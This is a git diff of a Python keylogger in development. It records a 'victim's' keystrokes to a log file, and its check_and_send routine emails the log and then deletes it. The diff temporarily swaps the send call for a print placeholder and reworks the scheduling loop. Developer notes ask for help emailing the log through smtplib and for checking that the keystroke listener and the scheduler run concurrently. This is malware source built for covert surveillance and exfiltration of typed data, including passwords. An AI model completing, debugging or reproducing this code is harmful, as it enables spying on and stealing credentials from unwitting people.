@@ -141,8 +141,10 @@ def check_internet():
 		return False
 
 def check_and_send():
+	time.sleep(1800)
 	if check_internet():
-		send_attachment()
+		# send_attachment()
+		print("Sendidng Attacment") # placeholder to deal with current issues first then attend to functon ^^
 		# Delete file afterwards
 		if os.path.exists(log_file):
 			os.remove(log_file)
@@ -152,17 +154,12 @@ def check_and_send():
 	else:
 		with open(log_file, 'a') as file:
 			file.write(f"Victim has no internet connection at this time: {get_current_time()}.\n")
-
-# Schedule task to check internet connection and send attachment every 30 minutes
-schedule.every(2).minutes.do(check_and_send)
+	print("Scheduler running...")
 
 # Infinite loop to run the scheduler
 while True:
-	schedule.run_pending()
-	time.sleep(1)  # To avoid high CPU usage, can be adjusted based on requirements
-
-
-
+	# Schedule task to check internet connection and send attachment every 30 minutes
+	check_and_send()
 """ 
 * Workflow
 - Record key strokes,
@@ -179,5 +176,7 @@ BUGS FOUND
 2. How to send a *.log file via email using the smtplib module in python
 3. Check line 48 where log_file is declared: if your remove the path, if it affects where the file is created
 4. Look for ways to ignore the numpad keys if numpad key is off
-5. 
+5. my problem wit this code is I do not know if he 2 functions the listener and the scheduler  are concurrently running. can you add some code like print statements that will show me if both of them are running
 """
+
+# Now I will have to modify the code to send the log data when it is full of words for up to 30 characters
